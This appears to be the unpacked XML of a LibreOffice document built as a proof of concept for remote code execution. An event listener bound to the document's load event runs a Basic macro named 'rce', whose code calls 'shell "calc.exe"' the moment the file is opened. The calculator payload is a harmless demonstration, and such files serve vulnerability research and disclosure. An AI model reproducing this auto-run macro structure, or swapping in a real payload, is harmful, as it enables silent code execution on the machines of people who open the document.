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16000002C8F553A17D1977A147.gif" manifest:media-type="image/gif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>
    <office:event-listeners>
      <script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.rce.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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x="1.917cm" svg:y="0.367cm" svg:width="13.113cm" svg:height="11.818cm" draw:z-index="0"><draw:image xlink:href="Pictures/1000000000000316000002C8F553A17D1977A147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09:48:50.799000000</meta:creation-date>
    <dc:date>2020-02-10T10:08:12.927000000</dc:date>
    <meta:editing-duration>PT4M44S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:generator>LibreOffice/6.4.0.3$Windows_x86 LibreOffice_project/b0a288ab3d2d4774cb44b62f04d5d28733ac6df8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

<file path=Basic/Standard/rce.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="rce" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main
  shell "calc.exe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